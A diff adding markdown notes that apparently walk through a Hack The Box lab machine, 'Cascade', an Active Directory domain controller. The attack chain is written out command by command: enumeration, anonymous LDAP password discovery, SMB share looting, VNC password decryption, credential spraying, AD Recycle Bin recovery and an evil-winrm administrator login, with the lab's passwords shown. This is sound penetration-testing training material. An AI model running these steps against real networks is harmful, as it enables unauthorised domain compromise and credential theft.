@@ -1,0 +1,161 @@
+### Enumeration
+```
+IP=10.10.10.10
+sudo nmap -sU $IP
+sudo nmap -p- -vv $IP
+sudo nmap -p -A $IP
+nc -nvv -w 1 $IP 1-1000 2>&1 | grep -v 'Connection refused'
+```
+### Ports
+- Banner Grab: nc -nv $IP PORT
+- 53
+	- DNS
+- 88
+	- kerberos
+- 135
+	- RPC
+- 139
+	- RPC
+- 389
+	- Microsoft Windows Active Directory LDAP (in: cascade.local., Site: Default-First-Site-Name)
+- 445
+	- smb
+- 636
+	- tcpwrapped
+- 3268
+	- Microsoft Windows Active Directory LDAP (in: cascade.local., Site: Default-First-Site-Name)
+- 3269
+	- tcpwrapped
+- 5985
+	- winrm
+- 49154-49158
+	- RPC
+- 49169
+	- RPC
+- 49170
+	- RPC
+- 49179
+	- RPC
+### Foothold
+- DNS
+	- nslookup
+		- server $IP
+		- 127.0.0.1
+	- dig @$IP domain
+		- If domain resolves
+			- dig axfr @$IP domain
+- RPC/ SMB
+	- enum4linux $IP
+	- crackmapexec smb $IP -u guest -p "" --rid-brute
+	- crackmapexec smb $IP -u "" -p "" --pass-pol
+	- rpcclient -U '' $IP
+		- enumdomusers
+			- CascGuest
+			- arksvc
+			- s.smith
+			- r.thompson
+			- util
+			- j.wakefield
+			- s.hickson
+			- j.goodhand
+			- a.turnbull
+			- e.crowe
+			- b.hanson
+			- d.burman
+			- BackupSvc
+			- j.allen
+			- i.croft
+		- queryusergroups RID
+		- queryuser RID
+- LDAP
+	- ldapsearch -h 10.10.10.182 -x -s base namingcontexts
+		- DC=cascade,DC=local
+	- ldapsearch -h 10.10.10.182 -x -b "DC=cascade,DC=local" > ldap-anonymous
+	- ldapsearch -h 10.10.10.182 -x -b "DC=cascade,DC=local" '(objectClass=person)' > ldap-people
+		- Find cascadeLegacyPwd: clk0bjVldmE= for r.thompson
+		- echo 'clk0bjVldmE=' | base64 -d
+			- rY4n5eva
+- 445
+	- smbclient -N -L //$IP
+		- anonymous login successful, no shares
+	- nmap --script smb-vuln* -p135,139,445 $IP
+- r.thompson
+	- crackmapexec smb -u r.thompson -p rY4n5eva --shares 10.10.10.182
+		- READ 
+			- Data
+				- smbclient --user r.thompson //10.10.10.182/data rY4n5eva
+					- mask ""
+					- recurse ON
+					- prompt OFF
+					- mget *
+				- Then look through files
+					- Meeting_Notes_June_2018.html
+						- Email from steve smith
+						- Username: TempAdmin
+						- Password is the admin account password
+					- VNC Install.reg
+						- "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
+							- echo '6bcf2a4b6e5aca0f' | xxd -r -p > vnc_enc_pass
+							- /opt/vncpwd/vncpwd vnc_enc_pass
+							- sT333ve2
+								- crackmapexec smb 10.10.10.182 -u users.txt -p sT333ve2
+									- s.smith is successful
+			- NETLOGON
+			- print$
+			- SYSVOL
+- s.smith
+	- crackmapexec winrm 10.10.10.182 -u s.smith -p sT333ve2
+		- Connected
+	- crackmapexec smb -u smith -p sT333ve2 --shares 10.10.10.182
+		- READ
+			- Audit$  data  NETLOGON  print$  SYSVOL
+			- Audit$
+				- mask ""
+				- recurse ON
+				- prompt OFF
+				- mget *
+				- Look through files
+					- Audit.db
+						- DeletedUserAudit Table
+							- tempadmin deleted
+						- Ldap
+							- `1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
+					- CascAudit.exe
+						- Open with DNSpy on windows machine
+							- Find password: c4scadek3y654321
+							- Not the right password
+						- Set a breakpoint and find the password is: w3lc0meFr31nd
+	- crackmapexec smb 10.10.10.182 -u users.txt -p w3lc0meFr31nd
+		- arksvc is successful
+- arksvc
+	- evil-winrm -u arksvc -p "w3lc0meFr31nd" -i 10.10.10.182
+		- connected
+
+### PE
+#### Windows
+- s.smith
+	- whoami /all
+	- Root drive directory
+	- net user USERNAME
+		- Check group memberships
+			- Audit Share
+				- net localgroup "Audit Share"
+					- `Comment        \\Casc-DC1\Audit$
+					- `cd C:\shares\audit
+			- IT
+- arksvc
+	- net user USERNAME
+		- AD Recycle Bin
+			- Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
+				- tempadmin showing as deleted
+			- Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property *
+				- `cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVz
+				- echo YmFDVDNyMWFOMDBkbGVz | base64 -d
+					- baCT3r1aN00dles
+		- IT
+- crackmapexec winrm 10.10.10.182 -u administrator -p baCT3r1aN00dles
+	- Successful
+- evil-winrm -u administrator -p baCT3r1aN00dles -i 10.10.10.182
+	- rooted
+### Credentials
+### Lessons Learned
